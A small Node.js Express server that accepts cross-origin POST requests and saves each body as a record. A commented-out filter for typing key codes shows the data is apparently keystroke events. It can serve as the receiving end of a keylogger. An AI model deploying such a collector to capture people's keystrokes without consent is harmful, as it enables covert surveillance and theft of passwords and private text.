
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const RecordManager = require('./record-man');
const path = require('path');

const app = express();
let rm = new RecordManager(path.join(__dirname, 'records'));

app.use(bodyParser.urlencoded());
app.use(cors());

function isTypingKey(key) {
    let code = key.code;
    return (code >= 48 && code <= 90) || (code >= 96 && code <= 111) || (code >= 186 && code <= 222) || code == 8;
}

app.post('/', (req, res) => {
    /*var keyInfo = req.body;
    var seed = keyInfo.seed;
    if (isTypingKey(keyInfo)) {
        console.log('typing key');
        rm.addRecord(keyInfo);
    }*/
    rm.addRecord(req.body);
    res.json({
        success: true
    });
});

app.listen(8080);
